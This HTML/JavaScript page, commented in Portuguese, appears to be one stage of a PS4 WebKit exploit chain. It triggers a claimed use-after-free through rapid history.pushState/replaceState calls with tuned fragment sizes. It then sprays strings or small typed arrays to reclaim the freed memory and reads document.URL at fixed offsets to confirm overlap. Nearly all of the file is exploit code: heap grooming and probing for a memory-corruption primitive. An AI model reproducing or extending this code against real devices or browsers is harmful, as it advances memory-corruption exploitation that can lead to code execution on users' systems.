<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – PASSO F (Collision Pivot)</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
button { font-size:16px; padding:10px; margin:5px 0; width:100%; }
#log { white-space:pre-wrap; margin-top:15px; max-height:70vh; overflow:auto; }
</style>
</head>
<body>

<h2>PS4 WebKit – PASSO F: Type-Directed Collision</h2>

<button onclick="runF1()">PASSO F1 — String Collision</button>
<button onclick="runF2()">PASSO F2 — ArrayBuffer Micro-Pivot</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;

// -------------------------------------------------
// UAF TRIGGER (EXATO, VALIDADO)
// -------------------------------------------------
async function triggerUAF(){
    let size = BASE;
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);
        size += STEP;
        await sleep(5);
    }
    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

// -------------------------------------------------
// PASSO F1 — STRING COLLISION
// -------------------------------------------------
async function runF1(){
    logEl.textContent = "";
    log("=== PASSO F1: STRING COLLISION ===");

    await triggerUAF();

    const beforeLen = document.URL.length;
    log("[F1] URL.length (before) = " + beforeLen);

    // String collision: mesmo range de tamanho lógico do fragment
    let s1 = "B".repeat(170000);
    let s2 = "C".repeat(170000);
    let rope = s1 + s2;           // rope
    rope = rope.slice(0);         // força flatten

    // Leitura controlada
    log("[F1] charCodeAt(64)   = " + document.URL.charCodeAt(64));
    log("[F1] charCodeAt(256)  = " + document.URL.charCodeAt(256));
    log("[F1] charCodeAt(1024) = " + document.URL.charCodeAt(1024));
    log("[F1] charCodeAt(4096) = " + document.URL.charCodeAt(4096));

    const afterLen = document.URL.length;
    log("[F1] URL.length (after) = " + afterLen);

    log("=== END F1 ===");
    log(">>> Se algum offset mudar vs baseline, pivot CONFIRMADO <<<");
}

// -------------------------------------------------
// PASSO F2 — ARRAYBUFFER MICRO-PIVOT
// -------------------------------------------------
async function runF2(){
    logEl.textContent = "";
    log("=== PASSO F2: ARRAYBUFFER MICRO-PIVOT ===");

    await triggerUAF();

    const beforeLen = document.URL.length;
    log("[F2] URL.length (before) = " + beforeLen);

    // Micro-pivot: buffers do mesmo bucket (≤64 bytes)
    let bufs = [];
    for(let i=0;i<2000;i++){
        let b = new Uint8Array(32);
        b.fill(0x42); // 'B'
        bufs.push(b);
    }

    // Força churn
    for(let i=0;i<1000;i++){
        bufs[i] = null;
    }

    // Leitura controlada
    log("[F2] charCodeAt(64)   = " + document.URL.charCodeAt(64));
    log("[F2] charCodeAt(96)   = " + document.URL.charCodeAt(96));
    log("[F2] charCodeAt(128)  = " + document.URL.charCodeAt(128));
    log("[F2] charCodeAt(256)  = " + document.URL.charCodeAt(256));

    const afterLen = document.URL.length;
    log("[F2] URL.length (after) = " + afterLen);

    log("=== END F2 ===");
    log(">>> Qualquer mudança indica overlap real de backing-store <<<");
}

log("Ready.");
log("Trigger: BASE=977 STEP=14461 ITER=48 (EXATO)");
</script>

</body>
</html>

